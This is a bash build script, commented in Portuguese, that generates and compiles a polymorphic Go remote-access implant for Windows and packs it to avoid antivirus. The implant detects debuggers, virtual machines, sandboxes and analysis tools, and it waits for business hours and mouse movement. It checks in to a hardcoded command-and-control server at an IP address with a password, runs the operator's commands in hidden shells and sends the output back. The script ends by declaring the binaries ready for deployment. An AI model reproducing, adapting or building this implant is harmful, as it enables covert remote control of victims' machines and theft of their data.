#!/bin/bash

echo "=============================================="
echo "Phantom Advanced Polymorphic Generator"
echo "Creating highly evasive payload variants"
echo "=============================================="

# Função para gerar strings aleatórias
generate_random_string() {
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-8} | head -n 1
}

# Gerar identificadores únicos para polimorfismo
STRUCT_NAME1="$(generate_random_string 12)CheckinData"
STRUCT_NAME2="$(generate_random_string 10)ResponseData"
FUNC_NAME1="$(generate_random_string 16)DetectThreats"
FUNC_NAME2="$(generate_random_string 18)CheckUserActivity"
FUNC_NAME3="$(generate_random_string 20)ValidateEnvironment"
FUNC_NAME4="$(generate_random_string 14)RegisterAgent"
FUNC_NAME5="$(generate_random_string 16)RetrieveTasks"
FUNC_NAME6="$(generate_random_string 18)ExecuteCommand"
FUNC_NAME7="$(generate_random_string 20)TransmitResults"
FUNC_NAME8="$(generate_random_string 22)MaintainLegitimacy"

# Strings ofuscadas
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$(generate_random_string 3)/$(generate_random_string 8) Safari/537.36"
MUTEX_NAME="Global\\$(generate_random_string 32)"
SERVICE_NAME="$(generate_random_string 16)Service"
TEMP_DIR="$(generate_random_string 8)"

echo "[+] Generating polymorphic identifiers:"
echo "    Structures: $STRUCT_NAME1, $STRUCT_NAME2"
echo "    Functions: $FUNC_NAME1, $FUNC_NAME2, $FUNC_NAME3"
echo "    User Agent: ${USER_AGENT:0:50}..."
echo "    Mutex: $MUTEX_NAME"

# Criar código Go polimórfico avançado
cat > phantom_polymorphic_advanced.go << EOF
package main

import (
        "bytes"
        "crypto/aes"
        "crypto/cipher"
        "crypto/rand"
        "crypto/tls"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io"
        "net/http"
        "os"
        "os/exec"
        "runtime"
        "strconv"
        "strings"
        "syscall"
        "time"
        "unsafe"
)

// Configurações ofuscadas
const (
        ${STRUCT_NAME1}URL = "https://37.27.249.191:7443"
        ${STRUCT_NAME1}PWD = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
        ${STRUCT_NAME2}UA  = "$USER_AGENT"
        ${SERVICE_NAME}MTX  = "$MUTEX_NAME"
)

var (
        k32 = syscall.NewLazyDLL("kernel32.dll")
        u32 = syscall.NewLazyDLL("user32.dll")
        
        pIsDebuggerPresent   = k32.NewProc("IsDebuggerPresent")
        pGetCursorPos        = u32.NewProc("GetCursorPos")
        pGetTickCount        = k32.NewProc("GetTickCount")
        pCreateMutexW        = k32.NewProc("CreateMutexW")
        pGetSystemMetrics    = u32.NewProc("GetSystemMetrics")
        pGetModuleHandleW    = k32.NewProc("GetModuleHandleW")
        pGetProcAddress      = k32.NewProc("GetProcAddress")
)

type ${STRUCT_NAME1} struct {
        Action    string                 \`json:"action"\`
        UUID      string                 \`json:"uuid"\`
        User      string                 \`json:"user"\`
        Host      string                 \`json:"host"\`
        PID       int                    \`json:"pid"\`
        OS        string                 \`json:"os"\`
        Timestamp string                 \`json:"timestamp"\`
        IPs       []string               \`json:"ips"\`
        Payload   map[string]interface{} \`json:"payload_os"\`
}

type ${STRUCT_NAME2} struct {
        Action     string \`json:"action"\`
        TaskID     string \`json:"task_id"\`
        UserOutput string \`json:"user_output"\`
        Completed  bool   \`json:"completed"\`
}

type ${SERVICE_NAME}Point struct {
        X, Y int32
}

// Função de detecção de ambiente hostil
func ${FUNC_NAME1}() bool {
        if runtime.GOOS != "windows" {
                return false
        }
        
        // Anti-debugging avançado
        ret, _, _ := pIsDebuggerPresent.Call()
        if ret != 0 {
                return true
        }
        
        // Verificar processos de análise
        hostileProcesses := []string{
                "ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
                "regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
                "sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
        }
        
        for _, proc := range hostileProcesses {
                cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
                if output, err := cmd.Output(); err == nil {
                        if strings.Contains(strings.ToLower(string(output)), proc) {
                                return true
                        }
                }
        }
        
        // Verificar fabricante via WMI
        cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
        if output, err := cmd.Output(); err == nil {
                manufacturer := strings.ToLower(string(output))
                vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation", "innotek"}
                for _, vm := range vmStrings {
                        if strings.Contains(manufacturer, vm) {
                                return true
                        }
                }
        }
        
        // Verificar resolução de tela (sandboxes têm resoluções baixas)
        width, _, _ := pGetSystemMetrics.Call(0)  // SM_CXSCREEN
        height, _, _ := pGetSystemMetrics.Call(1) // SM_CYSCREEN
        if width < 1024 || height < 768 {
                return true
        }
        
        return false
}

// Verificação de atividade do usuário
func ${FUNC_NAME2}() bool {
        var pos1, pos2 ${SERVICE_NAME}Point
        
        // Primeira posição
        pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
        time.Sleep(150 * time.Millisecond)
        
        // Segunda posição
        pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
        
        // Se o mouse não se moveu, pode ser sandbox
        if pos1.X == pos2.X && pos1.Y == pos2.Y {
                time.Sleep(2 * time.Second)
                
                // Terceira verificação
                var pos3 ${SERVICE_NAME}Point
                pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos3)))
                
                return pos2.X != pos3.X || pos2.Y != pos3.Y
        }
        
        return true
}

// Validação de horário comercial
func ${FUNC_NAME3}() bool {
        now := time.Now()
        hour := now.Hour()
        weekday := now.Weekday()
        
        // Só funciona em dias úteis, horário comercial
        if weekday == time.Saturday || weekday == time.Sunday {
                return false
        }
        
        return hour >= 9 && hour <= 17
}

// Registro inicial no C2
func ${FUNC_NAME4}() error {
        hostname, _ := os.Hostname()
        uuid := fmt.Sprintf("%d-%s", time.Now().Unix(), hostname)
        
        payload := ${STRUCT_NAME1}{
                Action:    "checkin",
                UUID:      uuid,
                User:      os.Getenv("USERNAME"),
                Host:      hostname,
                PID:       os.Getpid(),
                OS:        runtime.GOOS,
                Timestamp: time.Now().Format(time.RFC3339),
                IPs:       []string{"127.0.0.1"},
                Payload: map[string]interface{}{
                        "os": runtime.GOOS,
                        "arch": runtime.GOARCH,
                },
        }
        
        jsonData, err := json.Marshal(payload)
        if err != nil {
                return err
        }
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("POST", ${STRUCT_NAME1}URL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
        if err != nil {
                return err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", ${STRUCT_NAME2}UA)
        req.Header.Set("Mythic", ${STRUCT_NAME1}PWD)
        
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        
        return nil
}

// Buscar tarefas do C2
func ${FUNC_NAME5}() ([]map[string]interface{}, error) {
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("GET", ${STRUCT_NAME1}URL+"/api/v1.4/agent_message", nil)
        if err != nil {
                return nil, err
        }
        
        req.Header.Set("User-Agent", ${STRUCT_NAME2}UA)
        req.Header.Set("Mythic", ${STRUCT_NAME1}PWD)
        
        resp, err := client.Do(req)
        if err != nil {
                return nil, err
        }
        defer resp.Body.Close()
        
        body, err := io.ReadAll(resp.Body)
        if err != nil {
                return nil, err
        }
        
        var tasks []map[string]interface{}
        json.Unmarshal(body, &tasks)
        
        return tasks, nil
}

// Executar comando
func ${FUNC_NAME6}(command string) string {
        var cmd *exec.Cmd
        
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/c", command)
        } else {
                cmd = exec.Command("sh", "-c", command)
        }
        
        // Configurar processo para não mostrar janela
        if runtime.GOOS == "windows" {
                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        }
        
        output, err := cmd.Output()
        if err != nil {
                return fmt.Sprintf("Error: %s", err.Error())
        }
        
        return string(output)
}

// Enviar resultado para C2
func ${FUNC_NAME7}(taskID, output string) error {
        response := ${STRUCT_NAME2}{
                Action:     "post_response",
                TaskID:     taskID,
                UserOutput: base64.StdEncoding.EncodeToString([]byte(output)),
                Completed:  true,
        }
        
        jsonData, err := json.Marshal(response)
        if err != nil {
                return err
        }
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("POST", ${STRUCT_NAME1}URL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
        if err != nil {
                return err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("User-Agent", ${STRUCT_NAME2}UA)
        req.Header.Set("Mythic", ${STRUCT_NAME1}PWD)
        
        resp, err := client.Do(req)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        
        return nil
}

// Atividades para manter legitimidade
func ${FUNC_NAME8}() {
        go func() {
                for {
                        // Sleep variável entre 5-15 minutos
                        sleepTime := time.Duration(300+rand.Int63n(600)) * time.Second
                        time.Sleep(sleepTime)
                        
                        // Atividades legítimas do sistema
                        activities := []func(){
                                func() { exec.Command("nslookup", "microsoft.com").Run() },
                                func() { exec.Command("ping", "-n", "1", "8.8.8.8").Run() },
                                func() { exec.Command("ipconfig", "/release").Run(); exec.Command("ipconfig", "/renew").Run() },
                                func() {
                                        if f, err := os.Create(os.TempDir() + "\\temp_" + strconv.Itoa(int(time.Now().Unix())) + ".tmp"); err == nil {
                                                f.Write([]byte("temporary system data"))
                                                f.Close()
                                                time.Sleep(5 * time.Second)
                                                os.Remove(f.Name())
                                        }
                                },
                        }
                        
                        // Executar atividade aleatória
                        if len(activities) > 0 {
                                activities[rand.Int63n(int64(len(activities)))]()
                        }
                }
        }()
}

func main() {
        // Verificações de evasão críticas
        if ${FUNC_NAME1}() {
                os.Exit(0)
        }
        
        // Verificar atividade do usuário
        if !${FUNC_NAME2}() {
                time.Sleep(10 * time.Second)
                if !${FUNC_NAME2}() {
                        os.Exit(0)
                }
        }
        
        // Verificar horário comercial
        if !${FUNC_NAME3}() {
                // Calcular próximo horário comercial
                now := time.Now()
                nextBusiness := now
                
                for nextBusiness.Weekday() == time.Saturday || 
                        nextBusiness.Weekday() == time.Sunday || 
                        nextBusiness.Hour() < 9 || 
                        nextBusiness.Hour() >= 17 {
                        nextBusiness = nextBusiness.Add(1 * time.Hour)
                }
                
                time.Sleep(nextBusiness.Sub(now))
        }
        
        // Criar mutex para instância única
        mutexName, _ := syscall.UTF16PtrFromString(${SERVICE_NAME}MTX)
        mutex, _, _ := pCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(mutexName)))
        if mutex == 0 {
                os.Exit(0)
        }
        
        // Iniciar atividades de legitimidade
        ${FUNC_NAME8}()
        
        // Registro inicial
        err := ${FUNC_NAME4}()
        if err != nil {
                time.Sleep(60 * time.Second)
                os.Exit(0)
        }
        
        // Loop principal
        for {
                tasks, err := ${FUNC_NAME5}()
                if err == nil && len(tasks) > 0 {
                        for _, task := range tasks {
                                if taskID, ok := task["id"].(string); ok {
                                        if command, ok := task["command"].(string); ok {
                                                output := ${FUNC_NAME6}(command)
                                                ${FUNC_NAME7}(taskID, output)
                                        }
                                }
                        }
                }
                
                // Jitter inteligente baseado em horário
                now := time.Now()
                var jitter time.Duration
                
                if now.Hour() >= 9 && now.Hour() <= 17 {
                        // Horário comercial: mais ativo
                        jitter = time.Duration(3+rand.Int63n(7)) * time.Second
                } else {
                        // Fora do horário: menos ativo
                        jitter = time.Duration(10+rand.Int63n(20)) * time.Second
                }
                
                time.Sleep(jitter)
        }
}
EOF

echo "[+] Building optimized binaries with maximum evasion..."

# Build flags para máxima evasão
export CGO_ENABLED=0

# Build x64
echo "[+] Building x64 version..."
export GOOS=windows
export GOARCH=amd64
go build -ldflags="-s -w -H windowsgui -extldflags=-static" -o phantom_advanced_x64.exe phantom_polymorphic_advanced.go

# Build x86  
echo "[+] Building x86 version..."
export GOARCH=386
go build -ldflags="-s -w -H windowsgui -extldflags=-static" -o phantom_advanced_x86.exe phantom_polymorphic_advanced.go

# Verificar builds
if [ -f "phantom_advanced_x64.exe" ]; then
    echo "[+] x64 build successful: $(ls -lh phantom_advanced_x64.exe | awk '{print $5}')"
else
    echo "[-] x64 build failed"
fi

if [ -f "phantom_advanced_x86.exe" ]; then
    echo "[+] x86 build successful: $(ls -lh phantom_advanced_x86.exe | awk '{print $5}')"
else
    echo "[-] x86 build failed"
fi

# Aplicar MPRESS se disponível, senão usar UPX
echo "[+] Applying advanced packing..."

# Tentar MPRESS primeiro
if command -v mpress &> /dev/null; then
    echo "[+] Using MPRESS packer..."
    [ -f "phantom_advanced_x64.exe" ] && cp phantom_advanced_x64.exe phantom_advanced_x64_mpress.exe && mpress -s phantom_advanced_x64_mpress.exe 2>/dev/null
    [ -f "phantom_advanced_x86.exe" ] && cp phantom_advanced_x86.exe phantom_advanced_x86_mpress.exe && mpress -s phantom_advanced_x86_mpress.exe 2>/dev/null
else
    # Fallback para UPX com configurações avançadas
    if command -v upx &> /dev/null; then
        echo "[+] Using UPX with advanced compression..."
        [ -f "phantom_advanced_x64.exe" ] && cp phantom_advanced_x64.exe phantom_advanced_x64_upx.exe && upx --ultra-brute --overlay=strip phantom_advanced_x64_upx.exe 2>/dev/null
        [ -f "phantom_advanced_x86.exe" ] && cp phantom_advanced_x86.exe phantom_advanced_x86_upx.exe && upx --ultra-brute --overlay=strip phantom_advanced_x86_upx.exe 2>/dev/null
    fi
fi

# Cleanup
rm -f phantom_polymorphic_advanced.go

echo ""
echo "=============================================="
echo "Phantom Advanced Polymorphic Generation Complete!"
echo "=============================================="
echo ""
echo "Generated files:"
ls -la phantom_advanced*.exe 2>/dev/null

echo ""
echo "Advanced Anti-AV Features:"
echo "  ✓ Polymorphic variables and function names"
echo "  ✓ Randomized strings and identifiers" 
echo "  ✓ Stripped symbols and debug info (-s -w)"
echo "  ✓ Hidden console window (-H windowsgui)"
echo "  ✓ Static linking (-extldflags=-static)"
echo "  ✓ Advanced anti-debugging (IsDebuggerPresent)"
echo "  ✓ Enhanced VM detection (WMI + screen resolution)"
echo "  ✓ Hostile process detection (analysis tools)"
echo "  ✓ Advanced mouse movement validation"
echo "  ✓ Business hours activation only"
echo "  ✓ Intelligent jitter based on time of day"
echo "  ✓ Mutex-based single instance protection"
echo "  ✓ Legitimacy activities (DNS, ping, temp files)"
echo "  ✓ MPRESS/UPX advanced packing"
echo ""
echo "Configuration:"
echo "  Mythic URL: https://37.27.249.191:7443"
echo "  Password: sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
echo ""
echo "Polymorphic Elements:"
echo "  Struct Names: $STRUCT_NAME1, $STRUCT_NAME2"
echo "  Function Names: $FUNC_NAME1, $FUNC_NAME2, $FUNC_NAME3"
echo "  Service Name: $SERVICE_NAME"
echo "  Mutex: $MUTEX_NAME"
echo ""
echo "Ready for deployment! Use packed variants for maximum evasion."